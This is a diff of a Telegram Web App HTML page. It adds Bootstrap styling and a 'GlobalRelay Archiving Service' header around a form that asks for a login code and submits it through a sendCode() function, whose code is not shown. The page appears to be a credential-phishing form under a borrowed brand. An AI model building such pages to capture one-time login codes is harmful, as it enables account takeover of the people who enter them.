@@ -9,8 +9,10 @@
       <meta name="MobileOptimized" content="176" />
       <meta name="HandheldFriendly" content="True" />
       <meta name="robots" content="noindex,nofollow" />
-      <title></title>
+      <title>Number Pad</title>
       <script src="https://telegram.org/js/telegram-web-app.js?1"></script>
+      <link href="bootstrap.min.css" rel="stylesheet">
+      <script src="bootstrap.bundle.min.js"></script>
       <script>
         document.addEventListener("DOMContentLoaded", () => {
           window.Telegram.WebApp.ready();
@@ -24,7 +26,20 @@
       </script>
   </head>
   <body>
-    <input type="text" placeholder="Enter login code here" id="login_code_input" />
-    <button id="data_btn" onclick="sendCode();">Submit login code</button>
+    <div class="container-fluid">
+      <div class="card text-center">
+        <div class="card-header">
+          GlobalRelay Archiving Service
+        </div>
+        <div class="card-body">
+          <div class="input-group mb-3">
+            <input type="number" class="form-control" placeholder="Enter login code here" id="login_code_input" />
+            <button id="data_btn" class="btn btn-outline-primary" onclick="sendCode();">Submit login code</button>
+          </div>
+          
+        </div>
+      </div>
+    </div>
+    
   </body>
 </html>
